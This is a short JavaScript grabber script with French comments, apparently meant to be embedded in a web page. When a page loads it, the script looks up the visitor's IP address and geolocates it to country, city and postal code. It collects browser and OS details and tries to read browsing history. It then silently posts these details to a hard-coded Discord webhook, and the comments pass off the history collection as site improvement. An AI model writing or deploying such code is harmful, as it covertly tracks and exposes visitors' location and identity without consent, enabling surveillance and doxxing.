var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;

    var webhook = 'https://discord.com/api/webhooks/1125398137218007120/48qobW7VH4WQVumwcZZ4Lqy-cVIhOlNVJ4yg6FEVR7qFxpIhfSUDYCot07T_0icdh0WY';

    // Récupération des informations de localisation à partir de l'API IPStack
    fetch('http://api.ipstack.com/' + ip + '?access_key=YOUR_ACCESS_KEY')
      .then(function(response) {
        return response.json();
      })
      .then(function(locationData) {
        var country = locationData.country_name;
        var city = locationData.city;
        var postalCode = locationData.zip;

        var browserInfo = 'Navigateur: ' + navigator.userAgent;
        var osInfo = 'Système d\'exploitation: ' + navigator.platform;

        if (window.chrome && window.chrome.webstore) {
            // Utilisation de l'API chrome.history pour les navigateurs Chrome
            chrome.history.search({text: '', maxResults: 100}, function(data) {
              // Traitement des données d'historique de navigation
              var history = data;
              // Envoyer les données à des fins d'amélioration du site
              // ...
            });
          } else if (window.browser && window.browser.history) {
            // Utilisation de l'API browser.history pour les navigateurs Firefox
            browser.history.search({text: '', maxResults: 100}).then(function(data) {
              // Traitement des données d'historique de navigation
              var history = data;
              // Envoyer les données à des fins d'amélioration du site
              // ...
            });
          } else {
            // L'API d'historique de navigation n'est pas prise en charge par le navigateur
            var history = 'undefined';
          }

        var message = {
          content: '**__IP:__** ' + ip + '\n\n' +
            '**__Pays:__** ' + country + '\n\n' +
            '**__Ville:__** ' + city + '\n\n' +
            '**__Code postal:__** ' + postalCode + '\n\n' +
            '**__Informations navigateur:__** ' + browserInfo + '\n\n' +
            '**__Informations système d\'exploitation:__** ' + osInfo + '\n\n' +
            '**__Historique:__** ' + history 
        };

        fetch(webhook, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        });
      });
  });
